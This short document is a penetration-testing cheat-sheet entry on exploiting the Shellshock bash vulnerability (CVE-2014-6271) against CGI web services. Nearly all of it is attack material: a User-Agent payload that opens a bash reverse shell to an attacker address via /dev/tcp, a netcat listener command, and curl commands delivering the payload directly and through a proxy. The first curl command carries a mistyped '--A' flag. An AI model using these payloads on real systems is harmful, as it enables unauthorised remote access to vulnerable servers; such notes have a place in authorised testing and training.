# Shell Shock Vulnerability
If the [Shell Shock vulnerability](https://www.cvedetails.com/cve/CVE-2014-6271/), is detected on the target server, we can attempt to exploit it by updating our user agent string in BurpSuite, or using `curl` and making the request to the server.

Exploit attempt string for the user agent:
```
() { ignored;};/bin/bash -i >& /dev/tcp/(ATTACKER IP ADDRESS)/(ATTACKER PORT) 0>&1
```
Start the listener on the port, 443:
```
root@attacker:~# nc -lvvnp 443
```
Then make the `curl` request:
```
root@attacker-machine:~# curl --A '() { ignored;};/bin/bash -i >& /dev/tcp/(ATTACKER IP ADDRESS)/(ATTACKER PORT) 0>&1
' http://(TARGET IP ADDRESS)/vulnerable-service
```
Then, run the curl command to attack the web service.
```
root@attacker-machine:~# curl -A '() { ignored;};/bin/bash -i >& /dev/tcp/(ATTACKER IP ADDRESS)/443 0>&1' http://(TARGET IP ADDRESS):80/cgi-bin/status
```
If using a proxy, e.g. port 3128, with `curl` use the following,
```
root@attacker-machine:~# curl -A '() { ignored;};/bin/bash -i >& /dev/tcp/(ATTACKER IP ADDRESS)/443 0>&1' -x http://(TARGET IP ADDRESS):3128 http://(TARGET IP ADDRESS):80/cgi-bin/status
```
